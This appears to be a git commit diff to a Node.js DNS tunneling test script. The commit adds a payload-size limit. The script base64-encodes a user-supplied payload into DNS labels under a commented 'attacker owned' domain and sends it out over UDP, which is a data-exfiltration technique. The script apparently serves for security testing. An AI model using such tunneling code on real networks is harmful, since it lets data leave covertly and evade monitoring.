ce1ae9e433b1ce53028577d33c1868375b04472a
nihalpasham <nihal.pasham@gmail.com>
2018-03-07 11:30:50 +0530

    Added a payload size check to ensure we create DNS spec'd FQDNs

--- dns_tunneling_test.js
+++ dns_tunneling_test.js
@@ -1,12 +1,12 @@
-                
+
 // DNS tunneling test Script
 
 const packet = require('dns-packet');
 const dgram  = require('dgram');
-const tld    = 'google.com';                                                                      // Attacker owned TLD. Using 'google.com' as a placeholder  
+const tld    = 'google.com';                                                                      // Attacker owned TLD. Using 'google.com' as a placeholder
 var str = new String();
 
-if (process.argv.length === 3) {                                                                  // Provide a payload
+if (process.argv.length === 3 && process.argv[2].length <= 140) {                                 // Provide an argument i.e. a payload not more than 140 characters/bytes. Each label in a FQDN can be 63 bytes and a complete FQDN has 256 bytes.
     var input = Buffer.from(process.argv[2]).toString('base64').replace('=', '_');                // Encode to base64, base64 is the closest option when it comes to compliance with the DNS spec
     console.log("\n ...Size of uncompressed, base64 encoded input is: " + input.length);          // Printing the number of encoded bytes
     for (i = 0;  i < input.length; i+=62) {
@@ -16,7 +16,7 @@ if (process.argv.length === 3) {                                                
   }
   else {
     console.log("Usage: "  + __filename +  " payload");
-    process.exit(-1);
+    process.exit(-1)
   }
 
 var socket = dgram.createSocket('udp4');                                                           // Use dns-packet and a 3rd party socket abstraction module to send or receive DNS messages
